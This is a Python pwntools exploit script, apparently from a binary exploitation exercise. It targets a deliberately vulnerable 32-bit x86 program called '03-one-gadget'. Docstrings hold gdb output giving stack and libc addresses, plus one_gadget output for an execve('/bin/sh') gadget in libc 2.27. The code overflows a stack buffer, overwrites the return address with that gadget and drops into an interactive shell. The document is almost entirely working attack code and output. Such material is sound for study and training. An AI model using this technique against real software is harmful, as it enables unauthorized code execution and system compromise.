#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x80484b6: file src/03-one-gadget.c, line 5.
(gdb) c
Continuing.
Reading /lib/i386-linux-gnu/libc.so.6 from remote target...
Reading /lib/i386-linux-gnu/libc-2.27.so from remote target...
Reading /lib/i386-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/03-one-gadget.c:5
5	int vulnerable() {
(gdb) i r $esp
esp            0xffffcf8c	0xffffcf8c
(gdb) p &buffer[0]
$1 = 0xffffcf00 ""
(gdb) info proc mappings 
process 1924
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
...
	0xf7dd1000 0xf7fa6000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa6000 0xf7fa7000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa7000 0xf7fa9000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa9000 0xf7faa000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
...
"""

"""
$ one_gadget /lib/i386-linux-gnu/libc-2.27.so
0x3d0d3 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL
...
"""

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/03-one-gadget'

vulnerable_ret_addr = 0xffaf368c
buffer_addr = 0xffaf3600
libc_addr = 0xf7dd1000
one_gadget_addr = libc_addr + 0x3d0d3

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p32(one_gadget_addr)
payload += p32(0) * ((256 - len(payload)) / 4)

p.readuntil('> ')
p.write(payload)
p.interactive()
